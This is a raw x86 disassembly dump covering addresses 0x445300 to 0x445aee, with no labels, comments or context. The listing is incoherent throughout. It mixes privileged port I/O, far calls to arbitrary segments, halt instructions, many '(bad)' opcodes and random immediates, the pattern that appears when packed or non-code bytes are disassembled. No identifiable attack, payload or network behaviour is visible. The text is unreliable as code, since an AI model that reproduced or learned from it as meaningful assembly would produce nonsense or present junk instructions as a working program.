  445300:	mov    dh,0xb9
  445302:	mov    dl,BYTE PTR [edx]
  445304:	je     0x4452ac
  445306:	loopne 0x44528a
  445308:	test   BYTE PTR [eax+0x33e81cc0],dl
  44530e:	test   eax,0xbb1b33ee
  445313:	hlt    
  445314:	jb     0x8f19b875
  44531a:	frstor [edi-0x28]
  44531d:	js     0x44eb6c22
  445323:	xor    eax,0x25a3c3db
  445328:	lods   al,BYTE PTR ds:[esi]
  445329:	xchg   esi,eax
  44532a:	mov    WORD PTR [eax-0x45905757],ds
  445330:	imul   eax,DWORD PTR [ebp+0x17],0x916b050d
  445337:	out    dx,eax
  445338:	cmp    al,0x55
  44533a:	arpl   WORD PTR [esi],dx
  44533c:	call   0x2880:0xb5a9671e
  445343:	out    dx,al
  445344:	sbb    cl,BYTE PTR [esi-0x52]
  445347:	imul   edx,DWORD PTR ds:0xc6e8231f,0x38d15662
  445351:	jns    0x4453c6
  445353:	retf   
  445354:	mov    ds:0x9acf417c,al
  445359:	test   eax,0x66a521f4
  44535e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44535f:	push   edi
  445360:	in     eax,0x18
  445362:	ins    BYTE PTR es:[edi],dx
  445363:	hlt    
  445364:	jb     0x44539c
  445366:	idiv   BYTE PTR [edi]
  445368:	lock sbb ah,BYTE PTR ds:0x3551eec
  44536f:	scas   eax,DWORD PTR es:[edi]
  445370:	dec    edx
  445371:	call   0xebf4:0x9e15c92d
  445378:	hlt    
  445379:	lea    eax,[edx]
  44537b:	pop    ebp
  44537c:	adc    ecx,DWORD PTR [ebp+0x31]
  44537f:	xor    edx,DWORD PTR [ebp+0x4eecd88f]
  445385:	outs   dx,BYTE PTR ds:[esi]
  445387:	fnstenv ds:0x24ebcadf
  44538d:	xchg   ebp,eax
  44538e:	out    0x8a,eax
  445390:	push   ecx
  445391:	or     DWORD PTR [ebp+0xcccead2],ebp
  445397:	aaa    
  445398:	add    eax,0x556f00d9
  44539d:	pop    ss
  44539e:	aam    0xf3
  4453a0:	out    0xbf,eax
  4453a2:	repz rcl DWORD PTR [edi],cl
  4453a5:	imul   ebp,DWORD PTR [ebx],0xd0f2be8a
  4453ab:	stos   BYTE PTR es:[edi],al
  4453ac:	xchg   edx,eax
  4453ad:	cli    
  4453ae:	cmp    al,0x95
  4453b0:	imul   esp,DWORD PTR [edx-0x7b8bc165],0xe91a3146
  4453ba:	stos   BYTE PTR es:[edi],al
  4453bb:	aad    0x41
  4453bd:	outs   dx,DWORD PTR ds:[esi]
  4453be:	sub    BYTE PTR [edi-0x35844986],bl
  4453c4:	pusha  
  4453c5:	loope  0x4453ff
  4453c7:	xlat   BYTE PTR ds:[ebx]
  4453c8:	test   eax,0xda0387dc
  4453cd:	or     al,0x88
  4453cf:	ins    DWORD PTR es:[edi],dx
  4453d0:	fdivr  DWORD PTR ds:0x9aaec754
  4453d6:	mov    dl,0x74
  4453d8:	sbb    DWORD PTR [edi-0x713b6565],esp
  4453de:	clc    
  4453df:	mov    cl,0x35
  4453e1:	int3   
  4453e2:	mov    WORD PTR [ebp+0x24bf7e3b],fs
  4453e8:	xchg   esp,eax
  4453e9:	cwde   
  4453ea:	popf   
  4453eb:	xlat   BYTE PTR ds:[ebx]
  4453ec:	xchg   ebp,eax
  4453ed:	cmp    al,0x46
  4453ef:	repz imul esi,esp,0xffffffd0
  4453f3:	mov    al,BYTE PTR [esi]
  4453f5:	dec    edx
  4453f6:	fadd   QWORD PTR [esi]
  4453f8:	iret   
  4453f9:	lahf   
  4453fa:	xchg   edi,eax
  4453fb:	shl    BYTE PTR [ebx+0x5f],0x61
  4453ff:	or     ah,ch
  445401:	sub    eax,0x678ae553
  445406:	sbb    DWORD PTR ds:[eax],0x1be878a9
  44540d:	sbb    BYTE PTR fs:[eax],0xe4
  445411:	sbb    ebx,ebp
  445413:	in     al,0xd
  445415:	test   al,0x54
  445417:	ret    0xc345
  44541a:	xchg   ebx,eax
  44541b:	repnz inc ecx
  44541d:	sbb    eax,0xe7f71db3
  445422:	outs   dx,DWORD PTR ds:[esi]
  445423:	pop    esp
  445424:	mov    ebx,0xa544b9b3
  445429:	xor    DWORD PTR [edi-0x44],esi
  44542c:	pop    ebp
  44542d:	mov    eax,ds:0x4b625ddb
  445432:	out    0xe4,eax
  445434:	lds    edx,FWORD PTR [edi-0xf402a74]
  44543a:	mov    eax,0x3ab9fa84
  44543f:	xor    edx,ebp
  445441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445442:	mov    ebp,DWORD PTR [edx-0x28bb4f68]
  445448:	mov    esp,0x21d56a46
  44544d:	mov    ecx,0x3e60cca3
  445452:	and    al,BYTE PTR [edx+0xa]
  445455:	fwait
  445456:	retf   
  445457:	inc    eax
  445458:	cmp    eax,0xecf8698f
  44545d:	in     al,dx
  44545e:	aam    0x82
  445460:	int    0x78
  445462:	mov    esi,0xc75089c4
  445467:	je     0x44546e
  445469:	fisubr WORD PTR ds:0x541280f0
  44546f:	push   es
  445470:	sbb    al,0xf9
  445472:	int    0xe5
  445474:	fild   WORD PTR ds:0x66a081b1
  44547a:	in     eax,dx
  44547b:	mov    ds:0x2eba26b,eax
  445480:	add    al,0x27
  445482:	lea    ebp,[edx+0x1c]
  445485:	mov    esp,esp
  445487:	dec    BYTE PTR [ecx]
  445489:	mov    ds:0x7f238ad4,eax
  44548e:	out    dx,eax
  44548f:	in     al,0x12
  445491:	ret    0xfa1f
  445494:	pop    ss
  445495:	ja     0x44549d
  445497:	stc    
  445498:	lods   al,BYTE PTR ds:[esi]
  445499:	add    eax,0x282488c7
  44549e:	mov    cl,0xa4
  4454a0:	jno    0x44551c
  4454a2:	(bad)  
  4454a3:	daa    
  4454a4:	xchg   edi,eax
  4454a5:	dec    ebx
  4454a6:	xor    al,0xe
  4454a8:	push   esi
  4454a9:	push   esp
  4454aa:	add    ecx,ecx
  4454ac:	stos   BYTE PTR es:[edi],al
  4454ad:	ins    DWORD PTR es:[edi],dx
  4454ae:	mov    ebp,0x3ee91afc
  4454b3:	(bad)  [ecx]
  4454b5:	aas    
  4454b6:	xchg   esp,eax
  4454b7:	stos   DWORD PTR es:[edi],eax
  4454b8:	ds and eax,0x1bdaacff
  4454be:	out    dx,eax
  4454bf:	ins    BYTE PTR es:[edi],dx
  4454c0:	(bad)  
  4454c1:	ss add al,0x24
  4454c4:	leave  
  4454c5:	or     BYTE PTR [edi-0x47e7c778],dl
  4454cb:	mov    esp,0xe4b26582
  4454d0:	mov    edi,0x1941587d
  4454d5:	or     BYTE PTR ds:0xb1c8d466,bh
  4454db:	adc    al,0x86
  4454dd:	push   es
  4454de:	pop    edx
  4454df:	stos   DWORD PTR es:[edi],eax
  4454e0:	call   0x5e9906ce
  4454e5:	stc    
  4454e6:	repnz out dx,al
  4454e8:	call   0x956da66f
  4454ed:	int    0x2f
  4454ef:	(bad)  
  4454f0:	xchg   edx,eax
  4454f1:	addr16 clc 
  4454f3:	rcr    DWORD PTR [ecx+0x248e9d62],1
  4454f9:	cdq    
  4454fa:	pop    esi
  4454fb:	sbb    al,0x40
  4454fd:	out    dx,al
  4454fe:	retf   0xa626
  445501:	pop    ebp
  445502:	ds int 0x85
  445505:	xchg   ebx,eax
  445506:	jmp    FWORD PTR [edx-0x2c]
  445509:	push   ebp
  44550a:	(bad)  [edi+ebx*1+0x6df969cf]
  445511:	add    BYTE PTR [edi],al
  445513:	ret    0xf923
  445516:	mov    esi,0x8a4407e3
  44551b:	mov    DWORD PTR [edi-0x66],0xceb6355b
  445522:	test   eax,0x29c402c
  445527:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445528:	jno    0x44553f
  44552a:	mov    ecx,0x2a7a7634
  44552f:	or     eax,0x591f45c6
  445534:	jo     0x4454d9
  445536:	cli    
  445537:	pop    edi
  445538:	and    BYTE PTR [eax+0x417b3095],ch
  44553e:	leave  
  44553f:	xchg   esp,eax
  445540:	jge    0x445558
  445542:	fidiv  WORD PTR [esi+edx*8-0x9]
  445546:	data16 xlat BYTE PTR ds:[ebx]
  445548:	mov    cl,0x88
  44554a:	mov    cl,0xc6
  44554c:	sbb    ch,BYTE PTR [ecx]
  44554e:	stc    
  44554f:	ss mov cl,ch
  445552:	(bad)  
  445554:	add    eax,0x610faa1
  445559:	test   DWORD PTR [edi+0x53a41138],ebp
  44555f:	dec    edi
  445560:	lahf   
  445561:	in     eax,0xd9
  445563:	aaa    
  445564:	push   ss
  445565:	dec    ecx
  445566:	jae    0x44559c
  445568:	pop    ecx
  445569:	mov    cl,0x67
  44556b:	dec    edi
  44556c:	cmp    bl,BYTE PTR [edx-0x7e2cbe05]
  445572:	(bad)
  445576:	sti    
  445577:	out    dx,eax
  445578:	mov    eax,0x2115ad44
  44557d:	mov    ds:0x5bfdefd0,eax
  445582:	cmp    eax,0xf7a156bf
  445587:	mov    bh,0xe0
  445589:	jge    0x4455e3
  44558b:	jp     0x445522
  44558d:	sub    al,0xf9
  44558f:	(bad)  
  445590:	adc    BYTE PTR [ecx+0x1663c727],ch
  445596:	push   0x22c2c50f
  44559b:	out    0xe,al
  44559d:	jmp    0x445547
  44559f:	push   edx
  4455a0:	and    DWORD PTR [ecx-0x43],ecx
  4455a3:	in     al,dx
  4455a4:	std    
  4455a5:	in     al,dx
  4455a6:	push   ss
  4455a7:	ja     0x44552f
  4455a9:	xchg   esp,eax
  4455aa:	push   ebx
  4455ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4455ac:	lea    eax,ss:[ecx-0x35f449c]
  4455b3:	std    
  4455b4:	mov    ah,0x4c
  4455b6:	push   ebp
  4455b7:	imul   esi,DWORD PTR [edi+0x0],0xffffffbe
  4455bb:	test   al,ch
  4455bd:	call   0x18c95bd3
  4455c2:	nop
  4455c3:	in     eax,dx
  4455c4:	xchg   ebx,eax
  4455c5:	push   ss
  4455c6:	in     al,dx
  4455c7:	push   ds
  4455c8:	adc    al,0xeb
  4455ca:	(bad)  
  4455cb:	adc    al,0x50
  4455cd:	sbb    edx,esi
  4455cf:	gs lahf 
  4455d1:	cdq    
  4455d2:	aaa    
  4455d3:	popa   
  4455d4:	addr16 mov al,ds:0x675b
  4455d8:	int3   
  4455d9:	pop    eax
  4455da:	test   esp,esi
  4455dc:	push   0x29
  4455de:	pop    ebp
  4455df:	mov    ebp,DWORD PTR ds:0x1214b33e
  4455e5:	pop    ds
  4455e6:	enter  0x2406,0x9e
  4455ea:	fwait
  4455eb:	hlt    
  4455ec:	sbb    al,0x8b
  4455ee:	aam    0xc6
  4455f0:	xlat   BYTE PTR ds:[ebx]
  4455f1:	add    al,0xca
  4455f3:	ror    BYTE PTR [eax],cl
  4455f5:	out    0xb1,eax
  4455f7:	les    ebx,FWORD PTR [edi+0x1]
  4455fa:	jle    0x4455df
  4455fc:	pop    ds
  4455fd:	cwde   
  4455fe:	add    eax,0xd883b8bd
  445603:	fs xor eax,0xe47620f5
  445609:	fnstsw WORD PTR [eax+eax*8-0x3b44b9cb]
  445610:	xor    al,0xdd
  445612:	lock inc ebx
  445614:	inc    ebp
  445615:	iret   
  445616:	lahf   
  445617:	repz fnsave [eax-0x31]
  44561b:	sbb    bl,BYTE PTR [ebx]
  44561d:	dec    ecx
  44561e:	bound  ebx,QWORD PTR [esi-0x53]
  445621:	lds    edi,FWORD PTR [edi-0x445b5792]
  445627:	sub    edx,DWORD PTR gs:[eax]
  44562a:	lods   al,BYTE PTR ds:[esi]
  44562b:	cs test al,0xcb
  44562e:	jp     0x445657
  445630:	xchg   esp,eax
  445631:	(bad)  
  445632:	mov    dh,0x14
  445634:	daa    
  445635:	inc    ebp
  445636:	jmp    0xf91c7ac6
  44563b:	bound  esi,QWORD PTR [esi]
  44563d:	out    0x5f,al
  44563f:	mov    cl,BYTE PTR [ebx]
  445641:	mov    dh,0x5b
  445643:	sub    eax,0x6cd21716
  445648:	rol    DWORD PTR [eax],cl
  44564a:	and    al,0x68
  44564c:	aas    
  44564d:	loopne 0x445670
  44564f:	inc    ebp
  445650:	or     al,0xa4
  445652:	jae    0x445691
  445654:	jp     0x44569f
  445656:	add    dh,BYTE PTR [edi+esi*1-0x4a3c56d8]
  44565d:	mov    BYTE PTR [eax+0x3c43e3f0],dh
  445663:	test   al,dh
  445665:	xor    bh,BYTE PTR [esi-0x88bc31c]
  44566b:	repnz test eax,0x6abb499d
  445671:	stos   DWORD PTR es:[edi],eax
  445672:	mov    al,0x3c
  445674:	fwait
  445675:	pop    edi
  445676:	sbb    eax,0xba599774
  44567b:	add    al,0x68
  44567d:	xchg   al,dl
  44567f:	push   ebx
  445680:	lds    ebx,FWORD PTR [ecx-0x6d]
  445683:	out    dx,al
  445684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445685:	jecxz  0x4456ea
  445687:	add    BYTE PTR [edx+ecx*2],al
  44568a:	mov    dh,0x56
  44568c:	ficomp WORD PTR [edx+0x4dc647bf]
  445692:	popa   
  445693:	imul   esp,ebp,0xffffff9f
  445696:	sbb    ecx,DWORD PTR [esi+0x3732b50]
  44569c:	jmp    0x52ca:0xe4ce3f09
  4456a3:	sub    al,0x20
  4456a5:	mov    eax,ds:0xfeeeec65
  4456aa:	in     eax,0x21
  4456ac:	aad    0x6a
  4456ae:	inc    esi
  4456af:	in     eax,0x30
  4456b1:	push   es
  4456b2:	fnstsw WORD PTR [edi]
  4456b4:	sbb    DWORD PTR [ecx-0x68],ebp
  4456b7:	cmp    cl,BYTE PTR [eax-0x26]
  4456ba:	ss lahf 
  4456bc:	ds pushf 
  4456be:	pop    ebx
  4456bf:	xor    DWORD PTR [edi-0x20],ecx
  4456c2:	lea    ecx,[eax+0x50]
  4456c5:	ret    
  4456c6:	sub    bh,BYTE PTR [ebx]
  4456c8:	sbb    eax,0xda4356a4
  4456cd:	and    al,0xb4
  4456cf:	xchg   esp,eax
  4456d0:	inc    ecx
  4456d1:	sub    edx,DWORD PTR [eax-0x6f92605]
  4456d7:	fnstenv [ebp-0x2ab4054]
  4456dd:	dec    esi
  4456de:	cmp    eax,0xe48be8c2
  4456e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4456e4:	mov    bl,BYTE PTR [ebx]
  4456e6:	data16 or dh,BYTE PTR [edx+0x6585aae0]
  4456ed:	ret    0xec95
  4456f0:	test   al,bl
  4456f2:	daa    
  4456f3:	hlt    
  4456f4:	sbb    al,0xe9
  4456f6:	sbb    al,cl
  4456f8:	jl     0x44574a
  4456fa:	dec    edi
  4456fb:	std    
  4456fc:	and    dl,BYTE PTR [edi-0x66b4a533]
  445702:	arpl   WORD PTR [edx-0x945466e],sp
  445708:	sub    bh,cl
  44570a:	pop    es
  44570b:	jl     0x445691
  44570d:	and    DWORD PTR [ebp+0x382751b0],edx
  445713:	in     al,dx
  445714:	mov    BYTE PTR [edx+0x6f],al
  445717:	mov    eax,ds:0xb9dad91c
  44571c:	loopne 0x4456d5
  44571e:	outs   dx,BYTE PTR ds:[esi]
  44571f:	inc    esi
  445720:	fdivp  st(4),st
  445722:	(bad)  [edi]
  445724:	pop    ss
  445725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445726:	repnz loope 0x4456fd
  445729:	cdq    
  44572a:	mov    ebp,0xf7a1054
  44572f:	es and al,0x91
  445732:	inc    esi
  445733:	paddsw mm2,QWORD PTR [edx+eiz*1]
  445737:	xchg   edi,eax
  445738:	dec    edx
  445739:	rol    BYTE PTR [ecx+ebp*2],0xd3
  44573d:	and    bh,BYTE PTR [edx-0x3c0fe00c]
  445743:	imul   edx,DWORD PTR [edi+0x31e22b6b],0x31
  44574a:	mov    esp,0x5940aaee
  44574f:	pop    ds
  445750:	xor    al,0x4c
  445752:	mov    bh,0x74
  445754:	cdq    
  445755:	xchg   ebp,eax
  445756:	pop    esi
  445757:	mov    es,WORD PTR [ebp+0x16f0565e]
  44575d:	stos   BYTE PTR es:[edi],al
  44575e:	sub    esp,eax
  445760:	jae    0x4457db
  445762:	aam    0x40
  445764:	(bad)  
  445765:	cli    
  445766:	cmp    ecx,ebx
  445768:	lds    esp,FWORD PTR [edi]
  44576a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44576b:	out    dx,eax
  44576c:	xlat   BYTE PTR ds:[ebx]
  44576d:	outs   dx,BYTE PTR ds:[esi]
  44576e:	ins    DWORD PTR es:[edi],dx
  44576f:	jg     0x44571b
  445771:	popa   
  445772:	mov    ebx,0x2cbec1d4
  445777:	add    esi,DWORD PTR ds:0x3be99501
  44577d:	inc    esp
  44577e:	mov    ds:0xf0a80065,al
  445783:	xchg   edi,eax
  445784:	or     esp,edi
  445786:	mov    ch,0x64
  445788:	mov    ds:0x2b80b380,eax
  44578d:	les    esp,FWORD PTR [ebp-0x15]
  445790:	push   edi
  445791:	bound  ebp,QWORD PTR [edx-0x48feb898]
  445797:	inc    esp
  445798:	xchg   edx,eax
  445799:	scas   al,BYTE PTR es:[edi]
  44579a:	daa    
  44579b:	pop    esi
  44579c:	xor    eax,0x97f7b24a
  4457a1:	cmp    eax,0x9024e5b7
  4457a6:	jbe    0x44580d
  4457a8:	pop    ds
  4457a9:	fs stos BYTE PTR es:[edi],al
  4457ab:	add    eax,0xf03dc639
  4457b0:	sub    bl,BYTE PTR [edx+0x61a5207b]
  4457b6:	arpl   WORD PTR [edx+0x57c81174],bx
  4457bc:	pop    ds
  4457bd:	or     eax,0x8b4486ae
  4457c2:	int3   
  4457c3:	cwde   
  4457c4:	and    ecx,DWORD PTR [ebp-0x63962f55]
  4457ca:	mov    ch,0xb
  4457cc:	xlat   BYTE PTR ds:[ebx]
  4457cd:	mov    WORD PTR [ebx+0x2d949e71],ss
  4457d3:	out    dx,al
  4457d4:	sbb    al,0x97
  4457d6:	test   al,0x88
  4457d8:	sbb    BYTE PTR [ebx],bl
  4457da:	icebp  
  4457db:	adc    al,0xf6
  4457dd:	sahf   
  4457de:	arpl   WORD PTR [ecx+0x3b],dx
  4457e1:	push   ecx
  4457e2:	mov    esi,0xd5dd4f54
  4457e7:	outs   dx,DWORD PTR ds:[esi]
  4457e8:	add    eax,0xb5eb2942
  4457ed:	neg    BYTE PTR [esi+0x6d89c6b2]
  4457f3:	mov    dl,0xd0
  4457f5:	out    dx,al
  4457f6:	inc    ebx
  4457f7:	aas    
  4457f8:	pop    ds
  4457f9:	gs adc eax,0x1b9ff018
  4457ff:	push   ds
  445800:	pop    edi
  445801:	add    al,0xc8
  445803:	stos   BYTE PTR es:[edi],al
  445804:	inc    edi
  445805:	in     eax,0x1e
  445807:	jg     0x445823
  445809:	sub    DWORD PTR [esp+edi*2],ebp
  44580c:	lock in eax,0x67
  44580f:	mov    al,0x91
  445811:	inc    esp
  445812:	ins    BYTE PTR es:[edi],dx
  445813:	call   0x66d0:0x1e0c
  445819:	cld    
  44581a:	aas    
  44581b:	and    ah,BYTE PTR [edi+edx*1]
  44581e:	dec    ecx
  44581f:	xchg   ecx,eax
  445820:	and    eax,0xa6c9cec9
  445825:	cmp    DWORD PTR [eax],edx
  445827:	dec    ebp
  445828:	sbb    eax,0xea4c9b9f
  44582d:	scas   eax,DWORD PTR es:[edi]
  44582e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44582f:	add    DWORD PTR [edi-0x30],0xffffffcd
  445833:	xor    cl,BYTE PTR [ebp+0x5724b801]
  445839:	idiv   DWORD PTR [ebx-0x748f7aea]
  44583f:	out    dx,eax
  445840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445841:	pop    es
  445842:	add    al,BYTE PTR [esi]
  445844:	adc    eax,0x1d24a57b
  445849:	leave  
  44584a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44584b:	ror    DWORD PTR [ebp+0x71],cl
  44584e:	xchg   edx,eax
  44584f:	jo     0x445897
  445851:	ds push ss
  445853:	or     eax,0xf1f5e510
  445858:	mov    edi,0x590bded
  44585d:	test   al,0x93
  44585f:	pop    eax
  445860:	mov    al,fs:0xa8ca7eb7
  445866:	sti    
  445867:	out    0x45,al
  445869:	div    ch
  44586b:	loopne 0x4457fb
  44586d:	daa    
  44586e:	(bad)  
  445870:	mov    BYTE PTR [ecx+0x170e4351],cl
  445876:	jb     0x445810
  445878:	popf   
  445879:	stc    
  44587a:	dec    ebp
  44587b:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44587d:	fsubr  DWORD PTR [ebx]
  44587f:	adc    ch,BYTE PTR [ecx+eiz*2-0x3ee97ef7]
  445886:	mov    dl,0xbd
  445888:	and    BYTE PTR [ecx-0x7],ch
  44588b:	sbb    al,0x4a
  44588d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44588e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44588f:	(bad)  [edi-0x5e]
  445892:	fwait
  445893:	sbb    ebx,DWORD PTR [ecx+0x64f87787]
  445899:	retf   0x50b8
  44589c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44589d:	adc    esp,DWORD PTR [ebx]
  44589f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4458a0:	sbb    edi,DWORD PTR [esi]
  4458a2:	xor    al,0xd6
  4458a4:	inc    esp
  4458a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4458a6:	sbb    ebp,DWORD PTR [edx]
  4458a8:	or     ebx,0x846ba8bf
  4458ae:	rol    DWORD PTR [ecx-0x58],1
  4458b1:	pop    ebp
  4458b2:	sub    al,0x95
  4458b4:	sub    DWORD PTR [ebp+0x7c1cde16],edx
  4458ba:	dec    ebp
  4458bb:	xor    al,0xa0
  4458bd:	push   es
  4458be:	call   0x4be6:0x78b75ed
  4458c5:	push   ds
  4458c6:	mov    bl,0xcd
  4458c8:	popf   
  4458c9:	mov    bh,0xc0
  4458cb:	rcr    DWORD PTR ds:0xbbbc8749,1
  4458d1:	hlt    
  4458d2:	test   DWORD PTR [eax-0x5810880c],ebx
  4458d8:	and    eax,0x9b3c2391
  4458dd:	lods   eax,DWORD PTR ds:[esi]
  4458de:	sub    ch,BYTE PTR ss:[ecx+ebp*4]
  4458e2:	cmp    eax,eax
  4458e4:	fstp   DWORD PTR [ecx+0x4f]
  4458e7:	add    bl,ah
  4458e9:	addr16 mov dh,0x12
  4458ec:	jne    0x4458bb
  4458ee:	mov    dl,0xee
  4458f0:	push   ds
  4458f1:	dec    edx
  4458f2:	jmp    0x35ea:0xd9eceb37
  4458f9:	cdq    
  4458fa:	mov    esi,ebx
  4458fc:	cmp    bh,ah
  4458fe:	adc    edx,ecx
  445900:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  445902:	test   al,0x7b
  445904:	div    esp
  445906:	sti    
  445907:	push   ecx
  445908:	mov    ds:0x2e24dbd6,al
  44590d:	xor    DWORD PTR [ebp+0x6],ebx
  445910:	jb     0x4458a1
  445912:	mov    bh,0x32
  445914:	mov    al,cl
  445916:	mov    bh,0x14
  445918:	jp     0x445924
  44591a:	test   eax,0xcba6e041
  44591f:	repz fcom st(5)
  445922:	mov    al,0x87
  445924:	pop    esp
  445925:	or     dl,BYTE PTR [eax-0x4cafec83]
  44592b:	je     0x4458b1
  44592d:	adc    al,0x74
  44592f:	mov    ebp,fs
  445931:	call   0x7fe7:0xb7b5084b
  445938:	out    dx,al
  445939:	dec    ebp
  44593a:	popa   
  44593b:	and    edi,edx
  44593d:	add    eax,0xf3efd4bf
  445942:	pop    edi
  445943:	fstp   QWORD PTR [ecx]
  445945:	je     0x4458ef
  445947:	mov    cl,0x84
  445949:	cmp    dh,BYTE PTR [edi-0x62c7e2f4]
  44594f:	int    0xc3
  445951:	adc    DWORD PTR [eax+ebx*2-0x21794aea],esp
  445958:	sbb    ebx,eax
  44595a:	sub    al,0xbf
  44595c:	adc    DWORD PTR [ecx-0x1b99a295],ecx
  445962:	icebp  
  445963:	pop    esp
  445964:	lods   al,BYTE PTR ds:[esi]
  445965:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  445966:	inc    di
  445968:	mov    al,0x2c
  44596a:	jbe    0x4459aa
  44596c:	mov    ebp,0x6ec4bd72
  445971:	mov    dl,0xa6
  445973:	call   0xe806e26d
  445978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445979:	aas    
  44597a:	loop   0x445963
  44597c:	pop    ds
  44597d:	pop    ecx
  44597e:	mov    ebp,0x12d8bbb5
  445983:	stos   BYTE PTR es:[edi],al
  445984:	lahf   
  445985:	popf   
  445986:	sti    
  445987:	test   DWORD PTR [ecx+0x1d],edx
  44598a:	scas   eax,DWORD PTR es:[edi]
  44598b:	pop    ss
  44598c:	sub    ah,BYTE PTR [esi+0x77364d21]
  445992:	iret   
  445993:	inc    esp
  445994:	outs   dx,BYTE PTR ds:[esi]
  445995:	cmp    ch,BYTE PTR [ebx+0x39]
  445998:	xchg   ecx,eax
  445999:	scas   eax,DWORD PTR es:[edi]
  44599a:	cmp    eax,DWORD PTR [ebx+0x30]
  44599d:	pop    edi
  44599e:	fucomp st(3)
  4459a0:	pop    ebx
  4459a1:	mov    ds:0xd94d66b7,eax
  4459a6:	push   cs
  4459a7:	int3   
  4459a8:	adc    eax,0xe4c4ce61
  4459ad:	cmp    DWORD PTR [ebp+0x73],0x24
  4459b1:	test   DWORD PTR [eax+0x471f557e],esp
  4459b7:	out    0x6f,al
  4459b9:	mov    ebx,0x394a6b04
  4459be:	rcpps  xmm4,xmm2
  4459c1:	add    eax,0xad319b5c
  4459c6:	inc    ebp
  4459c7:	push   0xe74779f5
  4459cc:	pusha  
  4459cd:	sub    BYTE PTR [edx+0x4c],0x1b
  4459d1:	jns    0x445979
  4459d3:	inc    ecx
  4459d4:	mov    ecx,0x733a565c
  4459d9:	sub    ah,0x93
  4459dc:	enter  0x163d,0x96
  4459e0:	jns    0x4459bb
  4459e2:	mov    ebp,0xaaa92580
  4459e7:	push   esi
  4459e8:	pop    es
  4459e9:	fdiv   QWORD PTR [ebp-0x34]
  4459ec:	rol    ebx,cl
  4459ee:	mov    eax,DWORD PTR [ebx+0xcee7858]
  4459f4:	sbb    eax,0xbf9e6d5
  4459f9:	dec    edx
  4459fa:	popa   
  4459fb:	std    
  4459fc:	jge    0x4459a6
  4459fe:	jae    0x445a3a
  445a00:	(bad)  
  445a01:	ffree  st(2)
  445a03:	repnz or eax,0xa8e33ba8
  445a09:	ins    DWORD PTR es:[edi],dx
  445a0a:	push   ebx
  445a0b:	fidivr WORD PTR [eax]
  445a0d:	cmp    DWORD PTR [eax+0x7ba5fd4d],eax
  445a13:	stos   BYTE PTR es:[edi],al
  445a14:	jnp    0x4459f0
  445a16:	cmc    
  445a17:	mov    esp,0x798b9a99
  445a1c:	push   edx
  445a1d:	inc    edx
  445a1e:	sub    DWORD PTR [edx],ecx
  445a20:	rcr    eax,0x8f
  445a23:	sub    DWORD PTR [ebx-0x45],0xffffffb8
  445a27:	je     0x445aa8
  445a29:	push   edi
  445a2a:	fsincos 
  445a2c:	jne    0x4459c6
  445a2e:	xor    ebx,esi
  445a30:	cs dec edx
  445a32:	addr16 jmp 0x445a98
  445a35:	dec    ecx
  445a36:	dec    edi
  445a37:	(bad)  
  445a38:	loope  0x4459ec
  445a3a:	jp     0x445a49
  445a3c:	scas   eax,DWORD PTR es:[edi]
  445a3d:	out    0xb4,eax
  445a3f:	sbb    al,0xe5
  445a41:	jb     0x445a46
  445a43:	in     al,dx
  445a44:	xchg   ebp,eax
  445a45:	cmp    DWORD PTR ds:0x9f00ec2d,esi
  445a4b:	adc    eax,edx
  445a4d:	into   
  445a4e:	mov    ecx,0xe5584264
  445a53:	lods   al,BYTE PTR ds:[esi]
  445a54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  445a55:	xor    al,0xa5
  445a57:	cld    
  445a58:	mov    ebx,edx
  445a5a:	adc    DWORD PTR [edi-0x4b7aa4eb],esp
  445a60:	cmovle edi,DWORD PTR [ebx+0x35d3b454]
  445a67:	fisub  DWORD PTR ds:0xf1e8a3fb
  445a6d:	(bad)  
  445a6e:	cs mov cl,0x1a
  445a71:	imul   ebp,ebx,0x7010f276
  445a77:	xor    ecx,DWORD PTR [esi+ebx*4+0x3256197b]
  445a7e:	xchg   DWORD PTR [esi-0x1f1d836c],ebx
  445a84:	not    edx
  445a86:	mov    ecx,0xb354bfc4
  445a8b:	jmp    0x3eeb1486
  445a90:	mov    ebp,0xc57bf7a1
  445a95:	mov    ch,0x29
  445a97:	jg     0x445a1c
  445a99:	mov    eax,edx
  445a9b:	push   esp
  445a9c:	psubsw mm2,mm7
  445a9f:	arpl   dx,di
  445aa1:	test   al,0x7b
  445aa3:	adc    ebp,DWORD PTR [edi]
  445aa5:	std    
  445aa6:	add    DWORD PTR [edx-0x7f33161c],ebx
  445aac:	cdq    
  445aad:	rcl    DWORD PTR [ebp-0x60b76c2b],0xe7
  445ab4:	jmp    0x445a53
  445ab6:	pop    ebx
  445ab7:	cmp    DWORD PTR [eax+0x78],esp
  445aba:	aaa    
  445abb:	ss fmul st(4),st
  445abe:	add    ebp,DWORD PTR [esi+0x756589c9]
  445ac4:	push   cs
  445ac5:	jnp    0x445aba
  445ac7:	pop    ds
  445ac8:	xor    esp,0xb7739bba
  445ace:	mov    al,0xbc
  445ad0:	jbe    0x445a88
  445ad2:	mov    ds:0x54e11d0a,eax
  445ad7:	inc    ebp
  445ad8:	imul   ebx,DWORD PTR [edx+edi*4-0x80],0x19
  445add:	sub    DWORD PTR [ebp+0x7c],ecx
  445ae0:	div    DWORD PTR [ebp+0x22f5bffe]
  445ae6:	sar    edi,0x22
  445ae9:	mov    ecx,0xc08c7702
  445aee:	push   ebp
